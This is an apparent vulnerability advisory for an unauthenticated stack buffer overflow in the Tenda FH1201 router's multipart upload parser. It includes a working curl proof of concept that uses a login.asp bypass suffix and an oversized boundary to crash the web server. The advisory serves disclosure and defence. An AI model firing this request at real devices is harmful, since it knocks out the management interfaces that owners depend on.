# CVE-TBD: Multipart `boundary` buffer overflow in `webCgiGetUploadFile` (Tenda FH1201)

## Summary

The Tenda FH1201 multipart parser copies the `boundary` parameter of `Content-Type` into a fixed-size
buffer without a length check. A `multipart/form-data` request whose boundary is 128 bytes or longer
stops the web server. The affected parser is shared by `/cgi-bin/UploadCfg` and `/cgi-bin/upgrade`;
both are reachable without credentials through the `login.asp` authentication bypass.

## Affected Product

- Vendor: Tenda · Product: FH1201 · Firmware: **V1.2.0.19(946)** (latest, 2026-07-13)

- Status: the vendor lists FH1201 V1.0 as end-of-life (discontinued 2015) yet published
  firmware V1.2.0.19(946) on 2026-07-13 as a security update for CVE-2026-11405

## Vulnerability Details

- Type: Stack-based Buffer Overflow (**CWE-121**)
- Component: `bin/httpd` → `webCgiGetUploadFile()` (called from `UploadCfg()` and `upgrade()`)
- Root cause: the boundary string taken from the request header is used to locate part delimiters; it
  is stored in a fixed-size stack buffer with no upper-bound check, so a long boundary overflows it.
  The parser is shared, therefore both `/cgi-bin/UploadCfg` and `/cgi-bin/upgrade` are affected.
- Related prior art: **CVE-2026-2930** reports a boundary overflow in the same function on the
  **Tenda A18**; FH1201 is not listed there, and the current FH1201 release still contains it.

## Proof of Concept (non-destructive: no upload completes, no configuration is changed)

```bash
B=$(python3 -c "print('B'*256)")
curl -i -X POST \
  -H "Content-Type: multipart/form-data; boundary=$B" \
  --data-binary $'--'"$B"$'\r\nContent-Disposition: form-data; name="file"; filename="c.cfg"\r\n\r\nDefault\r\n--'"$B"'--\r\n' \
  http://<router>/cgi-bin/UploadCfg/login.asp
#   connection reset; the web server stops answering
```

Measured boundary threshold (each attempt on a fresh instance):

| boundary length | request | web server afterwards |
|---|---|---|
| 64 | 302 | alive |
| **128** | connection reset | **dead** |
| 192 / 255 / 256 / 1024 / 4096 | connection reset | **dead** |

Control: the same 256-byte-boundary request sent to `/cgi-bin/UploadCfg` **without** the bypass suffix
returns `302 /login.asp` and the server stays alive — the request never reaches the parser, which
confirms both the authentication path and the vulnerable code path.

## Impact

- Unauthenticated denial of service of the web/management interface (repeatable at will) until the
  device is restarted.
- Memory corruption of the web server process; exploitability beyond denial of service was not
  investigated.

## CVSS 3.1

`CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` — **6.5**
Rationale: verified unauthenticated crash; no control-flow impact was demonstrated.

## Discovery

Discovered by Zimo-666 on 2026-10-17 via rehosting and boundary-length sweeps. Vendor notified: pending.
